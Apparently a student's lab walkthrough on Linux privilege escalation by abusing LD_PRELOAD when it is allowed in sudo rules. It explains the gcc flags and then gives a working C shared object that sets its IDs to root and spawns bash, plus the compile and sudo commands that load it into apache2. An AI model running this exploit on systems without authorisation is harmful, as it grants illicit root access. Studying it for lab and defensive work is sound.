## Detection

**Linux VM**

1. Check if `LD_PRELOAD` is allowed:
   ```bash
   sudo -l
   ```


Creating a shared object file 

Here's an explanation of each command:

1. **`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`**:
   - `gcc`: The GNU Compiler Collection, used to compile C programs.
   - `-fPIC`: Stands for "Position Independent Code," which ensures the generated code can be loaded at any memory address, essential for shared libraries.
   - `-shared`: Tells GCC to create a shared object (library) instead of an executable.
   - `-o /tmp/x.so`: Specifies the output file, in this case, a shared object file ned `x.so` in the `/tmp` directory.
   - `x.c`: The C source code file being compiled.
   - `-nostartfiles`: Instructs GCC not to link the default startup files that normally initialize a C program. Used here because we are compiling a shared library, not a standalone executable.

2. **`sudo LD_PRELOAD=/tmp/x.so apache2`**:
   - `sudo`: Runs the command as a superuser (root).
   - `LD_PRELOAD=/tmp/x.so`: Sets the `LD_PRELOAD` environment variable, which forces the system to load the shared object `/tmp/x.so` before any other libraries when starting `apache2`. This is often used to override standard library functions for debugging or exploitation purposes.
   - `apache2`: Starts the Apache HTTP server, with the `LD_PRELOAD` library loaded before it initializes.

**Backend:**
- The first command creates a shared library that can override or extend functionality in other applications.
- The second command uses the `LD_PRELOAD` technique to inject the shared library into the `apache2` process, possibly hijacking or modifying its behavior by replacing or extending functions within that process.

## Exploitation

**Linux VM**

1. Create a C file to escalate privileges:
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>

   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       system("/bin/bash");
   }
   ```
2. Save the file as `x.c`
3. Compile the shared object:
   ```bash
   gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
   ```

![[Pasted image 20240917195941.png]]

4. Execute a command with `LD_PRELOAD` set:
   ```bash
   sudo LD_PRELOAD=/tmp/x.so apache2
   ```


5. Check your user ID:
   ```bash
   id
   ```

![[Pasted image 20240906185033.png]]

